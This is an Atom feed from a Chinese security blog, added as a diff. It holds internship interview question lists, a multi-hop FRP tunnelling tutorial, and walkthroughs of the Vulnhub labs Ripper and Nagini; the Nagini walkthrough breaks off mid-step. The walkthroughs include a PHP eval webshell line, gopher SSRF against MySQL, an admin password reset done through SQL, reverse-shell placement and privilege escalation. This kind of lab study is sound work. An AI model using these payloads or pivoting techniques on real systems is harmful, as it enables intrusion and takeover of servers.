@@ -1,0 +1,984 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://xiaomaoq.github.io/</id>
+    <title>xiaomao</title>
+    <updated>2025-03-22T12:40:52.489Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://xiaomaoq.github.io/"/>
+    <link rel="self" href="https://xiaomaoq.github.io/atom.xml"/>
+    <subtitle>取法乎上，仅得其中&lt;br&gt;
+取法乎中，仅得其下</subtitle>
+    <logo>https://xiaomaoq.github.io/images/avatar.png</logo>
+    <icon>https://xiaomaoq.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, xiaomao</rights>
+    <entry>
+        <title type="html"><![CDATA[2025春招实习面经（大橘已定 ]]></title>
+        <id>https://xiaomaoq.github.io/2025-chun-zhao-shi-xi-mian-jing-da-ju-yi-ding/</id>
+        <link href="https://xiaomaoq.github.io/2025-chun-zhao-shi-xi-mian-jing-da-ju-yi-ding/">
+        </link>
+        <updated>2025-03-22T12:36:08.000Z</updated>
+        <content type="html"><![CDATA[<p>3.6-3.21，历时两周，总体还是很顺利的，运气好，真没想到能有机会。</p>
+<p>真的非常非常非常感谢<strong>Drunkbaby师傅</strong>，<strong>a14y师傅</strong>给的机会以及帮助，不然真的很难有机会进到tx的面试，很难有机会拿到offer。很幸运能够认识到两位师傅并且他们愿意帮助我！</p>
+<p>不要去想那么多，你一个月前能想到现在所发生的事情吗？</p>
+<p>2025第二开心的事情，把第一开心的事情留给秋招哈!!!</p>
+<h1 id="鹅-oc">鹅  （oc</h1>
+<h1 id=""></h1>
+<h2 id="一面-47mins-310">一面  47mins  （3.10</h2>
+<p>1.自我介绍</p>
+<p>2.细问实习内容</p>
+<p>3.比较棘手的项目，会问细节 原理以及绕过</p>
+<p>4.有意思的项目，也会细问</p>
+<p>5.挖SRC过程中，遇到的有意思的漏洞</p>
+<p>6.waf以及edr绕过</p>
+<p>7.再细问一个项目  内网方面的  (域，内网的一些打法思路以及追问一些实现细节</p>
+<p>8.简单介绍一下委派</p>
+<p>9.黄金票据   白银票据           krbtgt的作用是什么</p>
+<p>10.ai与日常工作的结合</p>
+<p>11.反问</p>
+<h2 id="二面-23mins-312">二面 23mins  （3.12</h2>
+<p>1.自我介绍</p>
+<p>2.介绍做的好的项目</p>
+<p>3.攻防过程中，会使用到什么样的工具 ，工具分类  有没有自己二开工具或开发工具</p>
+<p>4.攻防过程中的分工 ，会问具体以及团队的一些内容</p>
+<p>5.蓝队的经历</p>
+<ol start="6">
+<li>应急</li>
+</ol>
+<p>7.内存马排查</p>
+<p>8.以蓝队的视角去看我的攻击案例，能不能回溯出整个攻击链路</p>
+<h2 id="三面-22mins-318">三面  22mins  （3.18</h2>
+<p>1.自我介绍</p>
+<p>2.项目中的角色是什么？</p>
+<p>3.怎么打域控</p>
+<p>4.遇到高防护的AD如何打</p>
+<p>5.问项目经历</p>
+<p>6.云安全  （云原生 云服务</p>
+<p>7.src经历</p>
+<p>8.绕安全设备 waf等</p>
+<p>9.ctf比赛经历</p>
+<p>10.用diff做了些什么</p>
+<p>11.怎么去学习漏洞知识的</p>
+<p>12.有没有写过一些给自己提效的工具</p>
+<p>13.反问</p>
+<h1 id="顺丰-拒">顺丰  拒</h1>
+<h2 id="一面-14mins-317">一面 14mins  （3.17</h2>
+<p>1.介绍做的好的项目</p>
+<p>2.dnslog被ban了怎么办</p>
+<p>3.闲聊</p>
+<h2 id="二面-27mins-319">二面  27mins  （3.19</h2>
+<p>1.闲聊。。</p>
+<p>2.项目中的角色是什么？</p>
+<p>3.内网打法 (项目介绍</p>
+<p>4.蓝队视角 如何去应急 修复  (针对我说的案例</p>
+<p>5.介绍业务</p>
+<h1 id="长亭-华东">长亭 华东</h1>
+<p><strong>xxHR</strong></p>
+<h2 id="一面-20mins-37">一面 20mins  （3.7</h2>
+<p>1.对目标资产进行梳理</p>
+<p>2.小程序测试  反编译？</p>
+<p>3.shiro长度限制绕过</p>
+<p>4.sql注入</p>
+<p>5.waf绕过  各种的</p>
+<p>6.会不会java 审计</p>
+<p>7.任意文件下载 怎么利用</p>
+<p>8.免杀</p>
+<p>9.近源</p>
+<p>10.问项目</p>
+<p>11.钓鱼</p>
+<h2 id="二面-22mins-310">二面 22mins （3.10</h2>
+<p>1.问开发项目</p>
+<p>2.近源</p>
+<p>3.密码喷洒</p>
+<p>4.问项目</p>
+<p>5.免杀</p>
+<p>6.绕waf  edr</p>
+<p>7.云安全  docker逃逸</p>
+<p>8.拿到linux机器，如何找到域控</p>
+<p>9.如何打域控    喷洒和漏洞和exchange</p>
+<p>10.内存马怎么打</p>
+<p>11.文件下载</p>
+<p>12.SSRF 拿shell的思路</p>
+<p>13.php反序列化</p>
+<h1 id="长亭-北京">长亭 北京</h1>
+<h2 id="一面-14mins-313">一面  14mins （3.13</h2>
+<p>1.为什么离职   能实习多久</p>
+<p>2.最快的getshell  信息收集方式</p>
+<p>3.深网 暗网信息</p>
+<p>4.找子域名</p>
+<p>5.泛解析判断</p>
+<p>6.java了解多少   如何审计</p>
+<p>7.如何打域控</p>
+<p>8.开发项目</p>
+<p>9.ai的东西</p>
+<h2 id="二面">二面</h2>
+<p>推了</p>
+<h1 id="深信服">深信服</h1>
+<p>岗位不是很匹配  主要是做威胁情报的</p>
+<h1 id="绿盟-武汉-17mins-313">绿盟 武汉 17mins （3.13</h1>
+<p>1.介绍做的好的项目</p>
+<p>2.离职原因拷打</p>
+<p>3.闲聊了</p>
+<h1 id="默安-火线云-拒了">默安 (火线云    拒了</h1>
+<p>问得很离谱？</p>
+<p>445端口被ban了，怎么打ms17-010？  我不会啊====</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[随笔2.28]]></title>
+        <id>https://xiaomaoq.github.io/sui-bi-228/</id>
+        <link href="https://xiaomaoq.github.io/sui-bi-228/">
+        </link>
+        <updated>2025-02-27T16:55:23.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>到现在还恍惚，就离职了。
+昨天想着，今天提，明天走
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[FRP多层内网隧道搭建]]></title>
+        <id>https://xiaomaoq.github.io/frp-duo-ceng-nei-wang-sui-dao-da-jian/</id>
+        <link href="https://xiaomaoq.github.io/frp-duo-ceng-nei-wang-sui-dao-da-jian/">
+        </link>
+        <updated>2024-04-14T06:52:42.000Z</updated>
+        <content type="html"><![CDATA[<p>这段时间状态都好差<br>
+发篇文章让自己奥里给起来</p>
+<p>参考https://blog.csdn.net/qingan6/article/details/130705151</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141448231.png" alt="image-20240414144828158" loading="lazy"></figure>
+<h1 id="第一层隧道">第一层隧道</h1>
+<h2 id="kali-启动-frps">kali 启动 frps</h2>
+<p>配置文件如下</p>
+<p>frps.ini</p>
+<pre><code class="language-cobol">[common]
+bind_addr = 0.0.0.0
+bind_port = 7001
+</code></pre>
+<p>启动命令</p>
+<pre><code class="language-r">./frps -c frps.ini
+</code></pre>
+<p>启动命令</p>
+<p>frps -c frps.ini</p>
+<p>Windows 后台运行</p>
+<p>start /b frps -c frps.ini<br>
+这样即使CTRL +C也不会断开</p>
+<p>Linux 后台运行</p>
+<p>nohup ./frps -c ./frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</p>
+<p>停止：</p>
+<p>先找到pid进程</p>
+<p>ps -aux|grep frp| grep -v grep</p>
+<p>例如找到进程为 6666</p>
+<p>kill -9 6666</p>
+<h2 id="win7启动-frpc">win7启动 frpc</h2>
+<p>frpc.ini      	去启动的时候 要把注释给去掉  不然就报错</p>
+<pre><code>[common]
+server_addr = 192.168.3.120  			//连接服务端   kali起的服务 
+server_port = 7001
+ 
+[http_proxy]
+type = tcp
+remote_port = 7777							// 建立socks节点的端口
+plugin = socks5
+local_ip = 192.168.11.129				//为了多层代理 
+local_port = 7777
+</code></pre>
+<p>启动命令</p>
+<pre><code class="language-r">frpc -c frpc.ini
+</code></pre>
+<h2 id="修改-etcproxychains4conf">修改 etc/proxychains4.conf</h2>
+<p>我的在这里面</p>
+<p>/usr/local/etc/proxychains.conf</p>
+<p>这里的socks节点建立在kali上 所以ip填的我 127.0.0.1   	后面就不是建立在这上面了</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141448907.png" alt="image-20240414144849881" loading="lazy"></figure>
+<h2 id="proxifier">Proxifier</h2>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141449022.png" alt="image-20240414144903993" loading="lazy"></figure>
+<p>配置好之后  就可以与11段通信了</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141449691.png" alt="image-20240414144939641" loading="lazy"></figure>
+<h1 id="第二层隧道">第二层隧道</h1>
+<p>要让本机去访问到 22网段</p>
+<p>此时win7 既是客户端又是服务端</p>
+<p>我们在win7 增加一个服务端</p>
+<h2 id="win7启动frps">win7启动frps</h2>
+<p>frps.ini      注意这个ip是填11段的   要让win10能够通到的</p>
+<pre><code class="language-cobol">[common]
+bind_addr = 192.168.11.129 	
+bind_port = 7000
+</code></pre>
+<p>frps -c frps.ini</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141449250.png" alt="image-20240414144955221" loading="lazy"></figure>
+<h2 id="win10启动frpc">win10启动frpc</h2>
+<p>frpc.ini</p>
+<pre><code>[common]
+server_addr = 192.168.11.129				//win7 启的那个 
+server_port = 7000
+
+[http_proxy]
+type = tcp
+remote_port = 7777
+plugin = socks5
+local_ip = 192.168.22.129
+local_port = 7777
+</code></pre>
+<p>frpc -c frpc.ini</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141450350.png" alt="image-20240414145003322" loading="lazy"></figure>
+<h2 id="修改-etcproxychains4conf-2">修改 etc/proxychains4.conf</h2>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141450297.png" alt="image-20240414145024210" loading="lazy"></figure>
+<h2 id="️多层代理下-proxifier如何设置">⚠️多层代理下 Proxifier如何设置</h2>
+<p>先增加一个代理</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141450405.png" alt="image-20240414145035380" loading="lazy"></figure>
+<p>然后点击Proxychains 右边create 将代理链按顺序从proxy servers里按住依次拖下，我这里起的名字 xiaomao，都要拖在你起的这个名字（我这里是xiaomao）里，注意在同一级，如图所示</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141450062.png" alt="image-20240414145043026" loading="lazy"></figure>
+<p>然后再去修改一下规则</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141450829.png" alt="image-20240414145050792" loading="lazy"></figure>
+<p>这里就可以访问到22 段了 开始访问win2012 失败   还以为又出问题了  闹了半天是防火墙的原因</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141451421.png" alt="image-20240414145117386" loading="lazy"></figure>
+<h1 id="第三层隧道">第三层隧道</h1>
+<p>原先win10的frpc.ini无需变动</p>
+<h2 id="win10-启动frps">win10  启动frps</h2>
+<p>frps.ini</p>
+<p>这个ip 是要可以与win2012通讯的那个ip</p>
+<pre><code class="language-cobol">[common]
+bind_addr = 192.168.22.129
+bind_port = 7000
+</code></pre>
+<p>frps -c frps.ini</p>
+<h2 id="win2012-启动frpc">win2012 启动frpc</h2>
+<p>frpc.ini</p>
+<p>local_ip = 192.168.33.130	 写另外一个网段的</p>
+<pre><code>[common]
+server_addr = 192.168.22.129 
+server_port = 7000
+
+[http_proxy]
+type = tcp
+remote_port = 7777
+plugin = socks5
+local_ip = 192.168.33.130  
+local_port = 7777
+</code></pre>
+<p>frpc -c frpc.ini</p>
+<h2 id="修改-etcproxychains4conf-3">修改 etc/proxychains4.conf</h2>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141451003.png" alt="image-20240414145138976" loading="lazy"></figure>
+<p>这样  33网段也可以在本机访问到了</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141451669.png" alt="image-20240414145148604" loading="lazy"></figure>
+<p>也可访问到 win2008的 192.168.33.129</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141451883.png" alt="image-20240414145156823" loading="lazy"></figure>
+<h2 id="proxifier-2">Proxifier</h2>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141452054.png" alt="image-20240414145210022" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141452573.png" alt="image-20240414145218544" loading="lazy"></figure>
+<p><strong>记得要改下规则啊</strong></p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141452428.png" alt="image-20240414145228395" loading="lazy"></figure>
+<p>舒服了啊</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202404141452126.png" alt="image-20240414145235092" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[0x15-Vulnhub靶机-Ripper]]></title>
+        <id>https://xiaomaoq.github.io/0x15-vulnhub-ba-ji-ripper/</id>
+        <link href="https://xiaomaoq.github.io/0x15-vulnhub-ba-ji-ripper/">
+        </link>
+        <updated>2024-03-23T14:12:53.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>最近开始准备学java了 🤡  有时间有闲情就打打靶机  (别学成开发去了 00.oo)</p>
+<h1 id="环境">环境</h1>
+<p>靶机地址-&gt; https://download.vulnhub.com/ripper/Ripper.ova</p>
+<p>感觉有点没意思吧这个</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>内部系统泄漏</li>
+<li>备份文件泄密</li>
+<li>Webmin漏洞利用</li>
+<li>msf</li>
+</ul>
+<h1 id="操作">操作</h1>
+<p>常规信息收集</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232012217.png" alt="image-20240323201230191" loading="lazy"></figure>
+<p>10000端口是一个webmin的界面</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232024481.png" alt="image-20240323202442462" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232036077.png" alt="image-20240323203617054" loading="lazy"></figure>
+<p><code>sudo nmap -sT -sV -O -p10000  192.168.3.132</code>    扫描webmin的版本</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232029336.png" alt="image-20240323202926301" loading="lazy"></figure>
+<p>就可以去直接搜(searchsploit) 有没有可以直接利用的  但是没看到满足版本    (也要用msf搜一搜 但是都要 账号密码)</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232153210.png" alt="image-20240323215332501" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232151255.png" alt="image-20240323215105195" loading="lazy"></figure>
+<p>然后就继续扫目录     (其实我们先不要去扫描 动静大    可以先试着去访问一下可能遗留的文件  robots.txt readme.txt readme.md 等 )</p>
+<p>这边扫的话 会在10000端口 扫出这个</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232032791.png" alt="image-20240323203249771" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232033303.png" alt="image-20240323203356281" loading="lazy"></figure>
+<p>搜索发现  rips是一个 代码分析工具</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232038782.png" alt="image-20240323203848749" loading="lazy"></figure>
+<p>那肯定就会存在这个界面 10000端口目录没有    还有个80界面呢</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232039198.png" alt="image-20240323203948154" loading="lazy"></figure>
+<p>点了点 找了找  就发现了一个账密  试着去登10000端口那个登录页面失败了   还有开放个22端口  试试ssh去连接</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232042075.png" alt="image-20240323204213038" loading="lazy"></figure>
+<p>就拿到了shell</p>
+<h2 id="第一次提权">第一次提权</h2>
+<p>看history去看他做什么了</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232059600.png" alt="image-20240323205945572" loading="lazy"></figure>
+<p>直接 su到cubes</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232100902.png" alt="image-20240323210017882" loading="lazy"></figure>
+<h3 id="用find命令去找文件">用find命令去找文件</h3>
+<p>查看你home目录下的用户，find命令查看根目录下宿主时cubes的文件</p>
+<p>**find / -user cubes -type f 2&gt;/dev/null **</p>
+<p>逐个查看，当查看到/mnt/secret.file（但是其实一眼可以看出secret这个单词，秘密的意思，这就很可疑）</p>
+<h2 id="第二次提权">第二次提权</h2>
+<p>(看wp用find去找有点牵强 一般也就看看passwd吧 )</p>
+<p><strong>find / -user cubes -type f -exec ls -la {} ; 2&gt;/dev/null</strong></p>
+<p>这条命令会返回很多的文件，使用grep过滤掉含porc目录的文件和png后缀的文件</p>
+<p><strong>find / -user cubes -type f -exec ls -la {} ; 2&gt;/dev/null | grep proc -v | grep '.png' -v</strong></p>
+<p>cubes到root</p>
+<p>通过history看历史命令 找啊找  又看到了一个账号密码</p>
+<p>username=admin&amp;pass=tokiohotel</p>
+<p>试着去su root 可以</p>
+<p>还有个登录界面呢   试了也成功了</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232109293.png" alt="image-20240323210903241" loading="lazy"></figure>
+<p>在后台有个执行命令的地方(本来webmin就是浏览器管理linux的软件) 	而且是个root权限 直接反弹   得到 root</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232134155.png" alt="image-20240323213421124" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232142034.png" alt="image-20240323214235999" loading="lazy"></figure>
+<h3 id="msf">msf</h3>
+<p>已经有后台账号密码了</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232152532.png" alt="image-20240323215217471" loading="lazy"></figure>
+<p>要改成true  因为是https</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232156756.png" alt="image-20240323215610729" loading="lazy"></figure>
+<p>但是不知道为啥通不了  不管了 知道思路就好了</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403232159865.png" alt="image-20240323215950841" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[随笔3.22]]></title>
+        <id>https://xiaomaoq.github.io/sui-bi-322/</id>
+        <link href="https://xiaomaoq.github.io/sui-bi-322/">
+        </link>
+        <updated>2024-03-22T03:52:12.000Z</updated>
+        <content type="html"><![CDATA[<p>👻</p>
+<p>终于把博客给弄好了，昨天干了一天无用功，得亏问了学长，不然估计会一直卡着</p>
+<p>本来准备换成hexo，因为gridea一直同步不了，但是在搞hexo的时候也遇到了类似的问题，后面学长帮我解决了，然后根据学长说的 把gridea搞了下代理 然后就可以和github通讯了  所以还是用这个 方便-，-</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403221145571.png" alt="image-20240322114543517" loading="lazy"></figure>
+<p>接下来的任务害，打靶肯定是要打，但是集中打得我有点想🤮了-</p>
+<p>开始学java！<br>
+<img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403222033310.png" alt="f3af9fbf76ba55353a14440d049b500" loading="lazy"><br>
+有心情打一打vulnhub(苑老师的和红队笔记的 跟着他们打) 或者是 打打春秋云镜(看大佬博客https://fushuling.com/    红日啥的内网靶机吧</p>
+<p>卷卷啊</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[0x14-VulnHub靶机-Nagini ]]></title>
+        <id>https://xiaomaoq.github.io/0x14-vulnhub-ba-ji-nagini/</id>
+        <link href="https://xiaomaoq.github.io/0x14-vulnhub-ba-ji-nagini/">
+        </link>
+        <updated>2024-03-19T04:28:07.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
+<p>靶机地址: https://download.vulnhub.com/harrypotter/Nagini.ova</p>
+<p>难度:有点难</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>SSRF (Gopher协议 + Mysql）</li>
+<li>http3 (但我懒得搞)</li>
+<li>已知cms后台搜索法</li>
+<li>SSH公钥登录 (传公钥到靶机上</li>
+<li>破解浏览器文件.mozilla  得到遗留密码</li>
+</ul>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规主机发现 端口扫描</p>
+<p>然后80端口就是一张图片  没啥可以利用得</p>
+<p>第一次目录扫描扫出        Joomla CMS  版本是最新的            常规方法试了没啥结果</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182030352.png" alt="image-20240318203027309" loading="lazy"></figure>
+<p>再扫joomla 还是发现很多东西的		但是没什么可以利用的</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182034539.png" alt="image-20240318203429466" loading="lazy"></figure>
+<p>用大字典继续扫</p>
+<p>dirsearch -u http://192.168.3.131/ -w /home/maomao/桌面/lujing.txt -f -e txt,bak,sql,zip</p>
+<p>bak 指的是备份文件</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182049410.png" alt="image-20240318204946381" loading="lazy"></figure>
+<p>发现个note.txt   给了两个提示</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182050179.png" alt="image-20240318205017153" loading="lazy"></figure>
+<p>修改hosts文件 然后用http3协议去访问   正常去访问看到的还是ip访问一样的内容</p>
+<pre><code>192.168.3.131   192.168.3.131   quic.nagini.hogwarts
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182058389.png" alt="image-20240318205845332" loading="lazy"></figure>
+<p>admin提示在本周之后就会去删除这个文件/internalResourceFeTcher.php，还有服务器上面有一些配置文件，这些配置文件是所有人都可以读取的  还提示有备份文件</p>
+<p>joomal的配置文件:configuration.php</p>
+<p>就去访问一下 提示给我们的路径</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182102466.png" alt="image-20240318210231428" loading="lazy"></figure>
+<h2 id="ssrf">SSRF</h2>
+<p>Welcome to Internal Network Resource Fetching Page    欢迎来到内网资源获取页面</p>
+<p>这意味着我们可以访问到内网的资源   我们现在在外网  这就是ssrf 服务器端请求伪造</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182131897.png" alt="image-20240318213120853" loading="lazy"></figure>
+<p>但是用file协议你要知道绝对路径才可以去读东西  当然可以去访问一下默认的配置文件有没有啥东西</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182139986.png" alt="image-20240318213908927" loading="lazy"></figure>
+<p>这里提示其实是要你正常去访问他的备份  你去访问/joomla/configuration.php其实存在但是你看到内容 这上面我们用他这个ssrf去访问的</p>
+<p>/joomla/configuration.php.bak就可以下载出来</p>
+<pre><code> public $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'goblin'; public $password = ''; public $db = 'joomla'; public $dbprefix = 'joomla_'; public $live_site = ''; public $secret = 'ILhwP6HTYKcN7qMh'; public 
+</code></pre>
+<p>这里发现了数据库的信息 而且没有密码  这里正愁不知道怎么突破外网了   这就送上来了</p>
+<p>SSRF突破边界的方法就是用gopher协议 通过mysql redis 等服务写🐎进去</p>
+<p>这里有数据库配置信息 我们用gopher协议判断是否开放了3306端口</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182157687.png" alt="image-20240318215722666" loading="lazy"></figure>
+<p>发现右上角一直跳动,那么后端是开放了3306端口的，只不过没有对外开放</p>
+<h2 id="利用gopher协议突破边界">利用gopher协议突破边界</h2>
+<p>利用gopher对mysql服务发送一些指令，读取数据库的信息，使用到一款工具Gopherus-master来进行生成向后端mysql发送指令的payload</p>
+<h3 id="直接写">直接写🐎</h3>
+<p>试图直接写个🐎进去   但是写不进去</p>
+<p><code>select '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;' into outfile '/var/www/html/ssrf.php'；</code></p>
+<h3 id="读数据库的东西">读数据库的东西</h3>
+<p>goblin</p>
+<p>这里知道public $db = 'joomla'; 库名</p>
+<p>use joomla;show tables;   用工具生成出来的还要url编码一下 (后面的那部分)</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182225096.png" alt="image-20240318222502023" loading="lazy"></figure>
+<p>发现个joomla_users</p>
+<p><code>use joomla;select * from joomla_users ;</code></p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182237530.png" alt="image-20240318223727508" loading="lazy"></figure>
+<p>直接你发现了 账号密码 但是这个密码是加密的   可以选择去进行解密，但是既然可以操作数据库，那么直接将site_admin的密码更换成mao（md5加密）</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182256881.png" alt="image-20240318225604859" loading="lazy"></figure>
+<p><code>use joomla;update joomla_users set password=&quot;3fe8ebd7f5996651fa46c4aefe24b6af&quot; where  username=&quot;site_admin&quot;;</code></p>
+<p>更新完密码之后 去到那个登录界面 登入进后台</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182258799.png" alt="image-20240318225824712" loading="lazy"></figure>
+<h2 id="joomla后台">joomla后台</h2>
+<p>直接去网上搜  joomal后台getshell  https://blog.csdn.net/qq_42084004/article/details/118971341</p>
+<p>去kali找一个反弹shell的🐎    位置在：/usr/share/webshells/php/php-reverse-shell.php</p>
+<p>把🐎写到error.php  找到文件位置 然后去访问</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190952548.png" alt="image-20240319095240483" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190953513.png" alt="image-20240319095342466" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<h3 id="第一次">第一次</h3>
+<p>在snape用户下 发现第一个flag     TG92ZUBsaWxseQ==  base64解码是 Love@lilly   文件名 .creds.txt 信用   猜可能是密码</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190957845.png" alt="image-20240319095720814" loading="lazy"></figure>
+<p>用ssh去连接一下 root snape  hermoine  就snape 用户成功登录了</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191002168.png" alt="image-20240319100220135" loading="lazy"></figure>
+<p>发现第一个flag</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191005993.png" alt="" loading="lazy"></figure>
+<h3 id="第二次">第二次</h3>
+<p>上传工具上去扫 发现有个suid  这个应该类似cp  并且其他用户可以执行</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191013454.png" alt="image-20240319101352429" loading="lazy"></figure>
+<p>那么思路就是将自己kali的<strong>公钥传输到目标中</strong>，使用su_cp命令，将<strong>公钥复制到hermoine的.ssh</strong>文件夹下，这样子kali就可以凭借公钥直接登录hermoine账号</p>
+<p>生成kali的密钥对  <code>ssh-keygen</code></p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191124500.png" alt="image-20240319112408470" loading="lazy"></figure>
+<p>使用scp将公钥传输到snape账号的主目录下</p>
